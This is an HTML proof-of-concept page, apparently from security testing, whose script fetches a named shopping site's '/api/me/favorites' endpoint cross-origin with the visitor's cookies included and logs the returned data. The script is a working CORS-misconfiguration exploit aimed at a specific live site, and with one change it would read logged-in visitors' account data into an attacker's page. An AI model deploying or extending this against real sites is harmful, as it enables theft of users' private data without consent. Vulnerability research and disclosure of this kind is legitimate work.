<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>CORS PoC</title>
  </head>
  <body>
    <script>
      // Attempt a cross-origin GET request to the favorites endpoint
      fetch("https://www.booztlet.com/eu/en/api/me/favorites", {
        method: "GET",
        // Include credentials (cookies) in the request
        credentials: "include",
        // You can set simple headers. Many headers (like User-Agent or Cookie) are managed by the browser.
        headers: {
          "Accept": "application/json, text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
      })
      .then(response => {
        if (!response.ok) {
          throw new Error("Network response was not ok: " + response.statusText);
        }
        // Assuming the response is JSON. Change as needed.
        return response.json();
      })
      .then(data => {
        console.log("Response data:", data);
      })
      .catch(error => {
        console.error("Fetch error:", error);
      });
    </script>
  </body>
</html>
